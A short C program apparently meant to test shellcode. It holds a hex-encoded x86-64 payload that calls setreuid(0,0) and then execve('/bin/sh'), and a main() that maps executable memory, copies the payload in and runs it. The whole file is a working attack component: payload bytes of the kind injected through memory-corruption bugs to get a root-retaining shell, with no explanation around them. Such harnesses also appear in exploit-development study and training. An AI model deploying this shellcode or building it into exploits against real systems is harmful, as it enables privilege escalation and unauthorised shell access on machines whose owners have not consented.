#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "\x90\x90\x90\x90\x90"
                   "\x48\x31\xc0"
                   "\x48\x83\xc0\x71"
                   "\x48\x31\xff"
                   "\x48\x31\xf6"
                   "\x0f\x05"
                   "\xeb\x13"
                   "\x48\x31\xc0"
                   "\x48\x83\xc0\x3b"
                   "\x5f"
                   "\x88\x67\x07"
                   "\x48\x31\xf6"
                   "\x48\x31\xd2"
                   "\x0f\x05"
                   "\xe8\xe8\xff\xff\xff"
                   "\x2f"
                   "\x62"
                   "\x69"
                   "\x6e"
                   "\x2f"
                   "\x73\x68"
                   "\x4e";

int main(int argc, char **argv) {
    void *ptr = mmap(0, sizeof(shellcode), PROT_EXEC | PROT_WRITE |
                     PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);
    if(ptr == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }
 
    memcpy(ptr, shellcode, sizeof(shellcode));
    sc = ptr;
 
    sc();
 
    return 0;
}

